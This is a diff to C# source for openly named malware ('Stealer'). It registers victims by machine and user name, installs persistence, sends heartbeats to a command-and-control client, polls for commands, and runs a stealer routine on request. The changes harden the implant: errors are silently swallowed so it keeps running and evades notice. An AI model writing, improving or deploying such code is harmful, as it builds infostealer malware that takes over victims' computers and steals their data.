@@ -14,15 +14,22 @@ namespace Stealer
 
         static void Main(string[] args)
         {
-            Config.Initialize();
-            _clientId = Environment.MachineName + "_" + Environment.UserName;
+            try
+            {
+                Config.Initialize();
+                _clientId = Environment.MachineName + "_" + Environment.UserName;
 
-            Persistence.Install();
+                try { Persistence.Install(); } catch { }
 
-            var heartbeatThread = new Thread(HeartbeatLoop) { IsBackground = true };
-            heartbeatThread.Start();
+                var heartbeatThread = new Thread(HeartbeatLoop) { IsBackground = true };
+                heartbeatThread.Start();
 
-            CommandLoop();
+                CommandLoop();
+            }
+            catch
+            {
+                Thread.Sleep(60000);
+            }
         }
 
         private static void HeartbeatLoop()
@@ -31,7 +38,7 @@ namespace Stealer
             {
                 try
                 {
-                    C2Client.SendHeartbeat(_clientId).Wait();
+                    C2Client.SendHeartbeat(_clientId).GetAwaiter().GetResult();
                 }
                 catch { }
                 Thread.Sleep(HeartbeatInterval);
@@ -44,10 +51,20 @@ namespace Stealer
             {
                 try
                 {
-                    var cmd = C2Client.PollCommand(_clientId).Result;
+                    string cmd = null;
+                    try
+                    {
+                        cmd = C2Client.PollCommand(_clientId).GetAwaiter().GetResult();
+                    }
+                    catch { }
+
                     if (!string.IsNullOrEmpty(cmd))
                     {
-                        HandleCommand(cmd).Wait();
+                        try
+                        {
+                            HandleCommand(cmd).GetAwaiter().GetResult();
+                        }
+                        catch { }
                     }
                 }
                 catch { }
@@ -63,7 +80,7 @@ namespace Stealer
                     await RunStealer();
                     break;
                 case "uninstall":
-                    Persistence.Uninstall();
+                    try { Persistence.Uninstall(); } catch { }
                     Environment.Exit(0);
                     break;
             }
